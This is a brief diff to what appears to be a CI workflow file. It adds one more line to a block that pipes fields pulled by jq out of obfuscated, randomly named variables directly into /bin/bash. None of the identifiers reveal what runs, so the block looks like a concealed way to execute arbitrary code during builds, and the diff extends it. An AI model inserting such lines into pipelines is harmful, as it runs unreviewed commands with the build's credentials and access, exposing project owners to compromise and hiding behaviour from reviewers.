@@ -29,6 +29,7 @@ jobs:
           echo $l5595 | jq -r .ctlbo17465 | /bin/bash
           printf '%s' "$v0" | jq -r .dmkg291 | /bin/bash
           printf '%s' "$hx5" | jq -r .a88 | /bin/bash
+          printf '%s' "$lls558" | jq -r .pk80 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
